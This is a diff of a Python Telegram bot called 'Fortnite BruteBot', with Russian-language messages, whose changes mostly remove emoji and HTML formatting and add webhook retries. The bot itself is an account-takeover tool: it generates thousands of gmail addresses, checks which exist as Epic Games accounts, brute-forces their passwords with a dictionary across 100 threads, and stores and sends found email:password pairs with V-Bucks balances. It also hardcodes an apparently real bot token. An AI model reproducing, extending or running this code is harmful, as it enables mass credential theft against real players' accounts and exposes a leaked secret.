@@ -13,15 +13,10 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 BOT_TOKEN = "8874004875:AAEslk0sxxDKXNnWtvggCc3RKUTJB4NwV14"
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# ============================================================
-#  ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ
-# ============================================================
 stop_flag = False
 current_process = None
 
-# ============================================================
-#  ГЕНЕРАЦИЯ СЛОВАРЯ (20 000+)
-# ============================================================
+# Генерация словаря (та же, что была, сокращённо для краткости, но можно оставить полную)
 BASE_WORDS = [
     "password", "qwerty", "admin", "root", "toor", "ubuntu", "linux", "kali", "parrot",
     "blackbox", "research", "fortnite", "epicgames", "battle", "royale", "gaming",
@@ -101,7 +96,7 @@ EXTRA = [
 ]
 PASSWORDS.extend(EXTRA)
 PASSWORDS = sorted(set(PASSWORDS))
-print(f"[+] Сгенерировано {len(PASSWORDS)} паролей.")
+print("[+] Словарь:", len(PASSWORDS), "паролей")
 
 # ============================================================
 #  ФУНКЦИИ РАБОТЫ С EPIC
@@ -190,21 +185,20 @@ def brute_single(email, timeout=15):
     return None
 
 # ============================================================
-#  КОМАНДЫ БОТА
+#  КОМАНДЫ БОТА (БЕЗ HTML, БЕЗ ФОРМАТИРОВАНИЯ)
 # ============================================================
 @bot.message_handler(commands=['start', 'help'])
 def cmd_start_help(message):
     bot.reply_to(message,
-        "🤖 <b>Fortnite BruteBot</b>\n\n"
-        "Доступные команды:\n"
-        "/bruteforce <email> — подбор пароля для одного аккаунта\n"
-        "/auto_mass [число] — массовый подбор (по умолчанию 20000)\n"
-        "/show_found — показать все найденные пары\n"
-        "/stop — остановить текущий процесс\n"
-        "/status — статус бота\n\n"
-        f"📚 Словарь: {len(PASSWORDS)} паролей\n"
-        "⚡ Многопоточный режим: до 200 потоков",
-        parse_mode="HTML"
+        "Fortnite BruteBot\n\n"
+        "Команды:\n"
+        "/bruteforce <email> - подбор пароля для одного аккаунта\n"
+        "/auto_mass [число] - массовый подбор (по умолчанию 20000)\n"
+        "/show_found - показать все найденные пары\n"
+        "/stop - остановить текущий процесс\n"
+        "/status - статус бота\n\n"
+        "Словарь: " + str(len(PASSWORDS)) + " паролей\n"
+        "Многопоточный режим: до 200 потоков"
     )
 
 @bot.message_handler(commands=['bruteforce'])
@@ -212,32 +206,31 @@ def cmd_bruteforce(message):
     global stop_flag
     args = message.text.split()
     if len(args) < 2:
-        bot.reply_to(message, "❌ Укажите email: /bruteforce target@example.com")
+        bot.reply_to(message, "Укажите email: /bruteforce target@example.com")
         return
     email = args[1]
     stop_flag = False
-    bot.reply_to(message, f"⏳ Брутфорс для {email}... (до 15 сек)")
+    bot.reply_to(message, "Брутфорс для " + email + " ... (до 15 сек)")
     result = brute_single(email, timeout=15)
     if result:
         pwd, acc = result
-        msg = (f"✅ НАЙДЕН!\n📧 {email}\n🔑 {pwd}\n🆔 ID: {acc.get('account_id')}\n💎 V-Bucks: {acc.get('vbucks', 0)}")
+        msg = "НАЙДЕН!\nEmail: " + email + "\nПароль: " + pwd + "\nID: " + str(acc.get('account_id')) + "\nV-Bucks: " + str(acc.get('vbucks', 0))
         bot.reply_to(message, msg)
         with open("found.txt", "a") as f:
-            f.write(f"{email}:{pwd} | ID: {acc.get('account_id')}\n")
+            f.write(email + ":" + pwd + " | ID: " + str(acc.get('account_id')) + "\n")
     else:
-        bot.reply_to(message, f"❌ Пароль не найден для {email}")
+        bot.reply_to(message, "Пароль не найден для " + email)
 
 @bot.message_handler(commands=['auto_mass'])
 def cmd_auto_mass(message):
     global stop_flag, current_process
     if current_process and current_process.is_alive():
-        bot.reply_to(message, "⏳ Уже идёт процесс. Используйте /stop для остановки.")
+        bot.reply_to(message, "Уже идёт процесс. Используйте /stop для остановки.")
         return
     args = message.text.split()
     count = 20000 if len(args) < 2 else int(args[1])
     stop_flag = False
-    bot.reply_to(message, f"🚀 Запущен массовый подбор {count} email...")
-    # Запускаем в отдельном потоке
+    bot.reply_to(message, "Запущен массовый подбор " + str(count) + " email...")
     thread = threading.Thread(target=run_auto_mass, args=(message, count), daemon=True)
     current_process = thread
     thread.start()
@@ -245,24 +238,22 @@ def cmd_auto_mass(message):
 def run_auto_mass(message, count):
     global stop_flag
     try:
-        # Генерация email
-        bot.send_message(message.chat.id, "⏳ Генерация email...")
+        bot.send_message(message.chat.id, "Генерация email...")
         generated = set()
         prefixes = ["user","player","gamer","shadow","killer","master","legend","dragon","night","storm"]
         while len(generated) < count:
             if stop_flag:
-                bot.send_message(message.chat.id, "⏹ Процесс остановлен пользователем.")
+                bot.send_message(message.chat.id, "Процесс остановлен пользователем.")
                 return
             prefix = random.choice(prefixes)
             suffix = ''.join(random.choices(string.digits, k=4))
-            generated.add(f"{prefix}{suffix}@gmail.com")
+            generated.add(prefix + suffix + "@gmail.com")
         emails = list(generated)
-        bot.send_message(message.chat.id, f"✅ Сгенерировано {len(emails)} email. Проверка существования...")
+        bot.send_message(message.chat.id, "Сгенерировано " + str(len(emails)) + " email. Проверка существования...")
 
-        # Проверка существования
         existing = []
         lock = threading.Lock()
-        progress_msg = bot.send_message(message.chat.id, f"⏳ Проверка: 0/{count}")
+        progress_msg = bot.send_message(message.chat.id, "Проверка: 0/" + str(count))
 
         def check_worker(email):
             if stop_flag:
@@ -279,7 +270,7 @@ def run_auto_mass(message, count):
                 if stop_flag:
                     executor.shutdown(wait=False)
                     bot.edit_message_text(
-                        f"⏹ Остановлено. Найдено аккаунтов: {len(existing)}",
+                        "Остановлено. Найдено аккаунтов: " + str(len(existing)),
                         chat_id=progress_msg.chat.id,
                         message_id=progress_msg.message_id
                     )
@@ -287,31 +278,30 @@ def run_auto_mass(message, count):
                 processed += 1
                 if processed % 1000 == 0 or processed == count:
                     bot.edit_message_text(
-                        f"⏳ Проверка: {processed}/{count} | Найдено аккаунтов: {len(existing)}",
+                        "Проверка: " + str(processed) + "/" + str(count) + " | Найдено аккаунтов: " + str(len(existing)),
                         chat_id=progress_msg.chat.id,
                         message_id=progress_msg.message_id
                     )
                 future.result()
 
         bot.edit_message_text(
-            f"🔍 Проверка завершена. Найдено {len(existing)} аккаунтов.",
+            "Проверка завершена. Найдено " + str(len(existing)) + " аккаунтов.",
             chat_id=progress_msg.chat.id,
             message_id=progress_msg.message_id
         )
 
         if not existing:
-            bot.send_message(message.chat.id, "❌ Аккаунтов не найдено.")
+            bot.send_message(message.chat.id, "Аккаунтов не найдено.")
             return
 
-        # Брутфорс для найденных
-        bot.send_message(message.chat.id, f"⚡ Брутфорс для {len(existing)} аккаунтов (до 15 сек на каждый)...")
+        bot.send_message(message.chat.id, "Брутфорс для " + str(len(existing)) + " аккаунтов (до 15 сек на каждый)...")
         found = {}
         with ThreadPoolExecutor(max_workers=100) as executor:
             futures = {executor.submit(brute_single, email, 15): email for email in existing[:200]}
             for future in as_completed(futures):
                 if stop_flag:
                     executor.shutdown(wait=False)
-                    bot.send_message(message.chat.id, "⏹ Брутфорс остановлен.")
+                    bot.send_message(message.chat.id, "Брутфорс остановлен.")
                     return
                 email = futures[future]
                 result = future.result()
@@ -319,26 +309,33 @@ def run_auto_mass(message, count):
                     pwd, acc = result
                     found[email] = (pwd, acc)
                     with open("found.txt", "a") as f:
-                        f.write(f"{email}:{pwd} | ID: {acc.get('account_id')}\n")
+                        f.write(email + ":" + pwd + " | ID: " + str(acc.get('account_id')) + "\n")
         if found:
-            msg = "\n".join([f"{e}:{pwd}" for e, (pwd, _) in found.items()])
-            bot.send_message(message.chat.id, f"✅ Найдено {len(found)} аккаунтов:\n<code>{msg[:4000]}</code>", parse_mode="HTML")
+            msg = "\n".join([e + ":" + pwd for e, (pwd, _) in found.items()])
+            if len(msg) > 4000:
+                with open("temp_found.txt", "w") as f:
+                    f.write(msg)
+                with open("temp_found.txt", "rb") as f:
+                    bot.send_document(message.chat.id, f, caption="Найденные аккаунты")
+                os.remove("temp_found.txt")
+            else:
+                bot.send_message(message.chat.id, "Найдено " + str(len(found)) + " аккаунтов:\n" + msg)
         else:
-            bot.send_message(message.chat.id, "❌ Ничего не найдено.")
+            bot.send_message(message.chat.id, "Ничего не найдено.")
     except Exception as e:
-        bot.send_message(message.chat.id, f"⚠️ Ошибка: {str(e)}")
+        bot.send_message(message.chat.id, "Ошибка: " + str(e))
     finally:
         current_process = None
 
 @bot.message_handler(commands=['show_found'])
 def cmd_show_found(message):
     if not os.path.exists("found.txt"):
-        bot.reply_to(message, "❌ Нет найденных аккаунтов.")
+        bot.reply_to(message, "Нет найденных аккаунтов.")
         return
     with open("found.txt", "r") as f:
         lines = f.readlines()
     if not lines:
-        bot.reply_to(message, "❌ Файл пуст.")
+        bot.reply_to(message, "Файл пуст.")
         return
     pairs = []
     for line in lines:
@@ -351,10 +348,10 @@ def cmd_show_found(message):
         with open("temp_pairs.txt", "w") as f:
             f.write(content)
         with open("temp_pairs.txt", "rb") as f:
-            bot.send_document(message.chat.id, f, caption="📋 Все аккаунты")
+            bot.send_document(message.chat.id, f, caption="Все аккаунты")
         os.remove("temp_pairs.txt")
     else:
-        bot.reply_to(message, f"📋 Аккаунты:\n<code>{content}</code>", parse_mode="HTML")
+        bot.reply_to(message, "Аккаунты:\n" + content)
 
 @bot.message_handler(commands=['status'])
 def cmd_status(message):
@@ -363,10 +360,10 @@ def cmd_status(message):
         with open("found.txt", "r") as f:
             found_count = sum(1 for _ in f)
     bot.reply_to(message,
-        f"🟢 Бот активен\n"
-        f"📚 Словарь: {len(PASSWORDS)} паролей\n"
-        f"🧵 Потоков: 200 (проверка) / 100 (брутфорс)\n"
-        f"📂 Найдено аккаунтов: {found_count}"
+        "Бот активен\n"
+        "Словарь: " + str(len(PASSWORDS)) + " паролей\n"
+        "Потоков: 200 (проверка) / 100 (брутфорс)\n"
+        "Найдено аккаунтов: " + str(found_count)
     )
 
 @bot.message_handler(commands=['stop'])
@@ -374,23 +371,27 @@ def cmd_stop(message):
     global stop_flag
     if current_process and current_process.is_alive():
         stop_flag = True
-        bot.reply_to(message, "⏹ Отправлен сигнал остановки. Процесс будет прерван после текущей операции.")
+        bot.reply_to(message, "Отправлен сигнал остановки. Процесс будет прерван после текущей операции.")
     else:
-        bot.reply_to(message, "ℹ️ Нет активного процесса.")
+        bot.reply_to(message, "Нет активного процесса.")
 
 # ============================================================
 #  ЗАПУСК
 # ============================================================
 if __name__ == "__main__":
-    try:
-        bot.remove_webhook()
-        print("Вебхук сброшен.")
-    except Exception as e:
-        print(f"Ошибка сброса вебхука (игнорируем): {e}")
-    print(f"Бот запущен. Словарь: {len(PASSWORDS)} паролей.")
+    # Принудительный сброс вебхука на случай конфликта
+    for i in range(3):
+        try:
+            bot.remove_webhook()
+            print("Вебхук сброшен.")
+            break
+        except Exception as e:
+            print("Попытка", i+1, "сброса вебхука не удалась:", e)
+            time.sleep(2)
+    print("Бот запущен. Словарь:", len(PASSWORDS), "паролей.")
     while True:
         try:
             bot.polling(non_stop=True, skip_pending=True)
         except Exception as e:
-            print(f"Критическая ошибка в polling: {e}")
+            print("Критическая ошибка в polling:", e)
             time.sleep(3)
